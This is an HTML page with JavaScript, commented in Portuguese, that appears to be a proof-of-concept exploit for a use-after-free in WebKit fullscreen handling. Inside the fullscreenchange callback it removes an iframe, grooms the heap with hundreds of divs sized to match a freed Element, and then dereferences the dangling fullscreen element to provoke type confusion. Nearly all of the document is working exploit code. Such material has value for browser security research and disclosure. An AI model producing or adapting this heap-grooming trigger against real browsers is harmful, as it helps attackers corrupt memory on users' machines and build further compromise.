<html>
<body>
<button id="run">Run</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  Após iframe.remove() no callback:
  1. Aloca 300 Elements de ~256 bytes — mesmo bin do Element fullscreen no heap
  2. Remove metade para pressionar o alocador a reutilizar slots freed
  3. Lê iDoc.webkitFullscreenElement (dangling ptr)
  4. Se heap realocou, el.clientWidth/el.children acessa memória de um dos nossos divs
     → type confusion → crash
*/
var iframe = document.getElementById("testFrame");
var popup  = null;

iframe.onload = function() {
    var iDoc = iframe.contentDocument;
    iDoc.open();
    iDoc.write('<html><body>' +
        '<div style="width:200px;height:150px;background:blue"></div>' +
        '</body></html>');
    iDoc.close();

    iDoc.addEventListener('webkitfullscreenchange', function() {
        document.getElementById("status").innerHTML = "callback fired";

        if (iframe && iframe.parentNode) iframe.remove();
        if (popup && !popup.closed) popup.close();

        // Heap groom imediatamente após o free
        // ~256 bytes por elemento — mesmo tamanho de Element no WebKit 64-bit
        var groom = [];
        for (var i = 0; i < 300; i++) {
            var d = document.createElement("div");
            d.setAttribute("data-g", new Array(200).join("G"));
            groom.push(d);
            document.body.appendChild(d);
        }
        // Remove metade para liberar slots — pressiona alocador
        // a reutilizar exatamente os bins do Element/Document freed
        for (var i = 0; i < 150; i++) {
            groom[i].parentNode.removeChild(groom[i]);
        }

        // Acesso ao dangling pointer
        try {
            var el = iDoc.webkitFullscreenElement;
            document.getElementById("status").innerHTML +=
                " | fsEl=" + (el ? el.tagName : "null");
            if (el) {
                // Derefernece — crash/UAF se heap foi realocado
                document.getElementById("status").innerHTML +=
                    " clientW=" + el.clientWidth +
                    " children=" + el.children.length +
                    " id='" + el.id + "'";
            }
        } catch(e) {
            document.getElementById("status").innerHTML += " | EX:" + e;
        }

        // Limpa resto do groom
        for (var i = 150; i < groom.length; i++) {
            if (groom[i].parentNode) groom[i].parentNode.removeChild(groom[i]);
        }
    });
};

document.getElementById("run").onclick = function() {
    popup = window.open("", "_blank", "width=400,height=300");
    popup.document.open();
    popup.document.write('<html><body><h3>Popup</h3></body></html>');
    popup.document.close();

    iframe.contentDocument.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;
        popup.focus();
        window.focus();
        iframe.contentWindow.focus();
        setTimeout(function() {
            if (popup && !popup.closed) popup.close();
        }, 300);
    }, 300);
};
</script>
</body>
</html>
